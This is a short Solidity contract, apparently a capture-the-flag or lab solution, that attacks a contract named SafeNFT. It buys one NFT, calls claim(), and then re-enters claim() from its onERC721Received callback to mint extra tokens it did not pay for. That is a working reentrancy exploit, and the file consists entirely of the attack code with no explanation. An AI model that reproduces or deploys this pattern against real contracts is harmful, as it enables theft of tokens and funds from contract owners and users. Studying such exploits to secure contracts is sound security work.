// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

import "./SafeNFT.sol";

contract SafeNFTAttack {
  safeNFT target;

  constructor(address _targetAddress) {
    target = safeNFT(_targetAddress);
  }

  function attack() external {
    target.buyNFT{ value: 0.01 ether }();
    target.claim();
  }

  function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
  ) external returns (bytes4) {
    if (target.balanceOf(address(this)) < 2) {
      target.claim();
    }

    return this.onERC721Received.selector;
  }
}
